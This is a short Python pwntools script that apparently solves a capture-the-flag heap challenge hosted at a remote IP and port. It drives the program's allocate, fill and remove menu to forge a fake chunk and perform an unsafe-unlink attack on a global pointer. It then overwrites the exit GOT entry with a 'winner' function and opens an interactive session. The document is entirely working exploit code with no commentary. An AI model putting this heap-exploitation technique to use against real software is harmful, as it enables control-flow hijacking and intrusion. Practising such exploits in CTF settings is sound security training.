from pwn import *

elf = context.binary = ELF("./src/soal")

# p = process("./soal")
p = remote('103.181.183.216', 17005)

#gdb.attach(p)

def choice(n):
    p.sendlineafter(b": ", f"{n}".encode())

def request(idx,size):
    choice(1)
    p.sendlineafter(b": ", f"{idx}".encode())
    p.sendlineafter(b": ", f"{size}".encode())

def fill(idx,content):
    choice(2)
    p.sendlineafter(b": ", f"{idx}".encode())
    p.sendafter(b": ", content)

def show(idx):
    choice(3)
    p.sendlineafter(b": ", f"{idx}".encode())

def remove(idx):
    choice(4)
    p.sendlineafter(b"idx : ", f"{idx}".encode())

ptrpertama = 0x4040a8

request(0,0x420)
request(1,0x420)

payload = p64(0) + p64(0x420) + p64(ptrpertama-24) + p64(ptrpertama-16)
payload = payload.ljust(0x420,b"\x00")
payload += p64(0x420) + p64(0x430)

fill(0,payload)
remove(1)

# gdb.attach(p)
payload = p64(0)*3 + p64(elf.got.exit)
fill(0,payload)

payload = p64(elf.sym.winner)
fill(0,payload)

p.interactive()